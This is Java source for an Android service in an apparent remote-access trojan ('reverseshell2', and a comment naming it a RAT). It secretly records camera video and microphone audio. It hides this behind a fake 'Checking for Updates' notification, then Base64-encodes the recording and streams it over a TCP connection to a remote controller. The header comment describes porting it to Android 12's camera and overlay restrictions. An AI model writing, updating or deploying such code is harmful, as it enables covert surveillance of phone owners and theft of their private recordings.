package com.example.reverseshell2.Payloads;

import android.Manifest;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.reverseshell2.R;
import com.example.reverseshell2.functions;
import com.example.reverseshell2.tcpConnection;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

/**
 * Video recorder service, rewritten for Android 12 using the Camera2 API.
 *
 * Why this rewrite was necessary for Android 12:
 *  1. The old code added a 1x1 SurfaceView overlay using
 *     WindowManager.LayoutParams.TYPE_TOAST. Overlay window types are restricted
 *     on Android 12, and a hidden overlay surface is no longer a valid approach
 *     for recording. The Camera2 API lets MediaRecorder provide its own input
 *     surface (MediaRecorder.getSurface()), so NO overlay window is needed at all.
 *  2. The deprecated android.hardware.Camera (Camera1) API was replaced with
 *     Camera2 (CameraManager / CameraDevice / CameraCaptureSession).
 *  3. The deprecated no-arg MediaRecorder() constructor is replaced with the
 *     Context-based constructor on API 31+.
 *  4. Foreground service types are now declared explicitly (camera | microphone)
 *     which Android 11+/12 requires for background camera and mic access.
 *  5. CAMERA + RECORD_AUDIO runtime permissions are now checked.
 *  6. stopForeground(true) is replaced with STOP_FOREGROUND_REMOVE on API 33+.
 *
 * Output protocol is UNCHANGED:
 *   - "Started Recording Video\n" on start
 *   - "stopVideo123\n" + Base64 MP4 + "END123\n" on stop
 */
public class videoRecorder extends Service {

    static String TAG = "videoRecorderClass";

    private CameraManager cameraManager;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private MediaRecorder mediaRecorder;

    private File videoFile;
    private Size videoSize;
    private String cameraId;
    private Surface_RecordingSurface recordingSurface = null;

    // Wrapper so we can hold the MediaRecorder surface across callbacks.
    private static class Surface_RecordingSurface {
        android.view.Surface surface;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String ins = intent != null ? intent.getStringExtra("ins") : null;
        if (ins != null && ins.equals("startFore")) {
            if (!hasPermission(Manifest.permission.CAMERA) || !hasPermission(Manifest.permission.RECORD_AUDIO)) {
                writeToStream("Camera/Mic Permission Not Granted\n");
                stopSelf();
                return START_STICKY;
            }

            new functions(null).createNotiChannel(getApplicationContext());
            Notification notification = new NotificationCompat.Builder(getApplicationContext(), "channelid")
                    .setContentTitle("Checking for Updates")
                    .setContentText("Fetching")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setProgress(0, 0, true)
                    .build();

            // Android 11+: declare camera + microphone foreground service types.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                startForeground(1234, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                                | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(1234, notification);
            }

            String id = intent.getStringExtra("cameraid");
            int camId = 0;
            try {
                camId = Integer.parseInt(id);
            } catch (NumberFormatException ignored) {
            }
            startVideo(camId, tcpConnection.out);
        }
        if (ins != null && ins.equals("stopFore")) {
            videoStop(tcpConnection.out);
        }
        return START_STICKY;
    }

    /* ------------------------------------------------------------------ */
    /* Recording                                                           */
    /* ------------------------------------------------------------------ */

    public void startVideo(final int cameraID, final OutputStream outputStream) {
        try {
            File outputDir = getApplicationContext().getCacheDir();
            videoFile = File.createTempFile("video", ".mp4", outputDir);
        } catch (IOException e) {
            e.printStackTrace();
            writeToStream("Error creating video file\n");
            return;
        }

        startBackgroundThread();

        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        if (cameraManager == null) {
            writeToStream("Failed to open camera\n");
            stopSelf();
            return;
        }

        try {
            cameraId = pickCamera(cameraManager, cameraID);
            if (cameraId == null) {
                writeToStream("Failed to open camera\n");
                stopSelf();
                return;
            }

            videoSize = chooseVideoSize(getSupportedVideoSizes(cameraId));

            // CAMERA permission already verified in onStartCommand.
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    setupMediaRecorder(outputStream);
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                    writeToStream("Failed to open camera\n");
                    stopSelf();
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    writeToStream("Failed to open camera\n");
                    stopSelf();
                }
            }, backgroundHandler);

        } catch (SecurityException e) {
            Log.e(TAG, "Camera permission missing", e);
            writeToStream("Camera Permission Not Granted\n");
            stopSelf();
        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera access error", e);
            writeToStream("Failed to open camera\n");
            stopSelf();
        }
    }

    private void setupMediaRecorder(final OutputStream outputStream) {
        try {
            // API 31+: use the Context-based constructor.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                mediaRecorder = new MediaRecorder(getApplicationContext());
            } else {
                mediaRecorder = new MediaRecorder();
            }

            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setOutputFile(videoFile.getAbsolutePath());
            mediaRecorder.setVideoEncodingBitRate(10_000_000);
            mediaRecorder.setVideoFrameRate(30);
            mediaRecorder.setVideoSize(videoSize.getWidth(), videoSize.getHeight());
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.prepare();

            android.view.Surface recorderSurface = mediaRecorder.getSurface();
            recordingSurface = new Surface_RecordingSurface();
            recordingSurface.surface = recorderSurface;

            List<android.view.Surface> surfaces = new ArrayList<>();
            surfaces.add(recorderSurface);

            cameraDevice.createCaptureSession(surfaces,
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            startRecording(outputStream);
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            writeToStream("Error in Initializing Camera\n");
                            releaseCamera();
                            stopSelf();
                        }
                    }, backgroundHandler);

        } catch (Exception e) {
            Log.e(TAG, "setupMediaRecorder failed", e);
            writeToStream("Error in Initializing Camera\n");
            releaseCamera();
            stopSelf();
        }
    }

    private void startRecording(final OutputStream outputStream) {
        try {
            CaptureRequest.Builder builder =
                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            builder.addTarget(recordingSurface.surface);

            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);

            captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);

            mediaRecorder.start();
            writeToStream("Started Recording Video\n");
        } catch (Exception e) {
            Log.e(TAG, "startRecording failed", e);
            writeToStream("Error in Initializing Camera\n");
            releaseCamera();
            stopSelf();
        }
    }

    public void videoStop(final OutputStream outputStream) {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
            } catch (IllegalStateException e) {
                writeToStream("Video Service Not Started.\n");
                releaseAll();
                return;
            } catch (RuntimeException e) {
                // Recording was never started - nothing to send.
                writeToStream("Video Service Not Started.\n");
                releaseAll();
                return;
            }

            releaseAll();

            if (videoFile != null && videoFile.length() != 0 && videoFile.exists()) {
                sendData(videoFile, outputStream);
            } else {
                writeToStream("Error in getting Video\n");
            }
            if (videoFile != null) {
                videoFile.delete();
            }
        } else {
            writeToStream("Video Service Not Started.\n");
        }
    }

    public void sendData(File file, final OutputStream outputStream) {
        writeToStream("stopVideo123\n");

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            int offset = 0;
            int read;
            while (offset < data.length
                    && (read = buf.read(data, offset, data.length - offset)) != -1) {
                offset += read;
            }
            buf.close();
            Log.d(TAG, String.valueOf(size));
            final String encodedVideo = Base64.encodeToString(data, Base64.DEFAULT);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        outputStream.write(encodedVideo.getBytes("UTF-8"));
                        outputStream.write("END123\n".getBytes("UTF-8"));
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            stopForeground(STOP_FOREGROUND_REMOVE);
                        } else {
                            stopForeground(true);
                        }
                        stopSelf();
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* ------------------------------------------------------------------ */
    /* Helpers                                                             */
    /* ------------------------------------------------------------------ */

    private boolean hasPermission(String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private String pickCamera(CameraManager manager, int preferred) throws CameraAccessException {
        String[] ids = manager.getCameraIdList();
        if (ids.length == 0) {
            return null;
        }
        int wanted = (preferred == 1)
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;
        for (String id : ids) {
            CameraCharacteristics ch = manager.getCameraCharacteristics(id);
            Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
            if (facing != null && facing == wanted) {
                return id;
            }
        }
        return ids[0];
    }

    private Size[] getSupportedVideoSizes(String id) throws CameraAccessException {
        CameraCharacteristics ch = cameraManager.getCameraCharacteristics(id);
        StreamConfigurationMap map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        if (map == null) {
            return new Size[]{new Size(1280, 720)};
        }
        Size[] sizes = map.getOutputSizes(MediaRecorder.class);
        if (sizes == null || sizes.length == 0) {
            sizes = map.getOutputSizes(android.view.SurfaceHolder.class);
        }
        if (sizes == null || sizes.length == 0) {
            return new Size[]{new Size(1280, 720)};
        }
        return sizes;
    }

    /**
     * Picks the largest supported size that does not exceed 1280x720
     * (720p is a good balance of quality and transfer size for a RAT video).
     */
    private Size chooseVideoSize(Size[] choices) {
        if (choices == null || choices.length == 0) {
            return new Size(1280, 720);
        }
        List<Size> bigEnough = new ArrayList<>();
        for (Size s : choices) {
            if (s.getWidth() <= 1280 && s.getHeight() <= 1280) {
                bigEnough.add(s);
            }
        }
        if (!bigEnough.isEmpty()) {
            return Collections.max(bigEnough, new CompareSizesByArea());
        }
        return choices[0];
    }

    private void releaseAll() {
        releaseCamera();
        if (mediaRecorder != null) {
            mediaRecorder.reset();
            mediaRecorder.release();
            mediaRecorder = null;
        }
    }

    private void releaseCamera() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (recordingSurface != null && recordingSurface.surface != null) {
            recordingSurface.surface.release();
            recordingSurface = null;
        }
        stopBackgroundThread();
    }

    private void writeToStream(final String message) {
        try {
            if (tcpConnection.out != null) {
                tcpConnection.out.write(message.getBytes("UTF-8"));
                tcpConnection.out.flush();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraVideoBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread == null) {
            return;
        }
        backgroundThread.quitSafely();
        try {
            backgroundThread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        backgroundThread = null;
        backgroundHandler = null;
    }

    static class CompareSizesByArea implements Comparator<Size> {
        @Override
        public int compare(Size lhs, Size rhs) {
            return Long.signum((long) lhs.getWidth() * lhs.getHeight()
                    - (long) rhs.getWidth() * rhs.getHeight());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseAll();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

